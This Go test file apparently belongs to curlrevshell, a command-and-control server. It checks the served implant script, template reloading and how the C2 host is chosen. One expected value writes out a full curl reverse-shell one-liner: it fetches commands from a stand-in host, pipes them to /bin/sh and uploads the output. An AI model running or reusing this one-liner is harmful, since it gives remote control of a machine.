package hsrv

/*
 * script_test.go
 * Tests for script.go
 * By J. Stuart McMurray
 * Created 20240324
 * Last Modified 20240731
 */

import (
	"bytes"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"text/template"

	"github.com/magisterquis/curlrevshell/lib/opshell"
)

func TestServerScriptHandler(t *testing.T) {
	cl, _, och, s := newTestServer(t)
	rr := httptest.NewRecorder()
	rr.Body = new(bytes.Buffer)
	s.scriptHandler(rr, httptest.NewRequest(http.MethodGet, "/c", nil))
	if http.StatusOK != rr.Code {
		t.Errorf("Non-OK Code %d", rr.Code)
	}

	/* Work out the ID and make sure the log is correct. */
	gotLog := <-och
	ms := regexp.MustCompile(` ID:(\S+) `).FindStringSubmatch(gotLog.Line)
	if 2 != len(ms) {
		t.Fatalf("Could not find ID in log line %q", gotLog.Line)
	}
	id := ms[1]
	gotLog.Line = strings.ReplaceAll(gotLog.Line, id, "IDID")
	wantLog := opshell.CLine{
		Color: ScriptColor,
		Line:  "[192.0.2.1] Sent script: ID:IDID URL:example.com",
	}
	if gotLog != wantLog {
		t.Errorf(
			"Incorrect log message:\n got: %#v\nwant: %#v",
			gotLog,
			wantLog,
		)
	}

	/* Make sure the template came out ok, too. */
	wantBody := `#!/bin/sh

curl -Nsk --pinnedpubkey "sha256//xxx=" https://example.com/i/IDID </dev/null 2>&0 |
/bin/sh 2>&1 |
curl -Nsk --pinnedpubkey "sha256//xxx=" https://example.com/o/IDID -T- >/dev/null 2>&1
`
	gotBody := rr.Body.String()
	gotBody = strings.ReplaceAll(gotBody, id, "IDID") /* Remove ID */
	gotBody = regexp.MustCompile(                     /* Remove hash */
		`"sha256//[0-9A-z+/]{43}="`,
	).ReplaceAllString(gotBody, `"sha256//xxx="`)
	if gotBody != wantBody {
		t.Errorf(
			"Incorrect body:\n"+
				" got:\n%s\n"+
				"want:\n%s",
			gotBody,
			wantBody,
		)
	}
	cl.ExpectEmpty(t)
}

/* Make sure changing and deleting a template file works. */
func TestServerScriptHandler_FromFile(t *testing.T) {
	cl, _, _, s := newTestServer(t)
	fn := filepath.Join(t.TempDir(), "kittens.tmpl")
	s.tmplf = fn
	defTxt := "default template"
	s.defTmpl = template.Must(template.New("").Parse(defTxt))

	var want string

	f := func(t *testing.T, expResCode int) {
		t.Helper()
		rr := httptest.NewRecorder()
		rr.Body = new(bytes.Buffer)
		s.scriptHandler(
			rr,
			httptest.NewRequest(http.MethodGet, "/c", nil),
		)
		if expResCode != rr.Code {
			t.Errorf(
				"Unexpected response code %d (!= %d)",
				rr.Code,
				expResCode,
			)
		}
		if got := rr.Body.String(); got != want {
			t.Errorf(
				"Incorrect body:\n got: %s\nwant: %s",
				got,
				want,
			)
		}
		cl.ExpectEmpty(t)
	}

	/* Test a custom template file. */
	t.Run("template_in_file", func(t *testing.T) {
		if err := os.WriteFile(
			fn,
			[]byte(`kittens: {{.URL}}`),
			0660,
		); nil != err {
			t.Fatalf("Error writing template to %s: %s", fn, err)
		}
		want = "kittens: example.com"
		f(t, http.StatusOK)
	})

	/* Test a change to the file. */
	t.Run("changed_file", func(t *testing.T) {
		if err := os.WriteFile(
			fn,
			[]byte(`moose: {{.URL}}`),
			0660,
		); nil != err {
			t.Fatalf("Error writing template to %s: %s", fn, err)
		}
		want = "moose: example.com"
		f(t, http.StatusOK)
	})

	/* Test an empty file. */
	t.Run("empty_file", func(t *testing.T) {
		if err := os.WriteFile(fn, nil, 0660); nil != err {
			t.Fatalf(
				"Error writing empty template to %s: %s",
				fn,
				err,
			)
		}
		want = ""
		t.Run("empty_file", func(t *testing.T) { f(t, http.StatusOK) })
		f(t, http.StatusOK)
	})

	/* Test removing the file. */
	t.Run("removed_file", func(t *testing.T) {
		if err := os.Remove(fn); nil != err {
			t.Fatalf("Error removing %s: %s", fn, err)
		}
		want = ""
		f(t, http.StatusInternalServerError)
	})
}

func TestC2URL(t *testing.T) {
	cl, _, _, s := newTestServer(t)
	/* Work out our listen port, for testing. */
	_, serverPort, err := net.SplitHostPort(s.l.Addr().String())
	if nil != err {
		t.Fatalf("Error getting server's listen port: %s", err)
	}
	if HTTPSPort == serverPort {
		t.Fatalf(
			"Test server listening on port %s, this breaks tests",
			HTTPSPort,
		)
	}
	for _, c := range []struct {
		have *http.Request
		want string
	}{{
		have: httptest.NewRequest(
			http.MethodGet,
			"https://kittens.com/simple_URL",
			nil,
		),
		want: "kittens.com",
	}, {
		have: httptest.NewRequest(
			http.MethodGet,
			"http://kittens.com/as_param?"+
				C2Param+
				"=moose.com",
			nil,
		),
		want: "moose.com",
	}, {
		have: func() *http.Request {
			req := httptest.NewRequest(
				http.MethodGet,
				"http://kittens.com/as_header",
				nil,
			)
			req.Header.Set(
				C2Param,
				"moose.com",
			)
			return req
		}(),
		want: "moose.com",
	}, {
		have: func() *http.Request {
			req := httptest.NewRequest(
				http.MethodGet,
				"https://kittens.com/from_SNI",
				nil,
			)
			req.Host = ""
			return req
		}(),
		want: net.JoinHostPort("kittens.com", serverPort),
	}, {
		have: func() *http.Request {
			req := httptest.NewRequest(
				http.MethodGet,
				"https://kittens.com/as_header",
				nil,
			)
			req.Header.Set(
				C2Param,
				"moose.com",
			)
			return req
		}(),
		want: "moose.com",
	}} {
		t.Run(c.have.URL.String(), func(t *testing.T) {
			got, err := s.c2URL(c.have)
			if nil != err {
				t.Fatalf("Error: %s", err)
			}
			if got != c.want {
				t.Fatalf(
					"URL incorrect:\n"+
						" got: %s\n"+
						"want: %s",
					got,
					c.want,
				)
			}
		})
	}
	cl.ExpectEmpty(t)
}
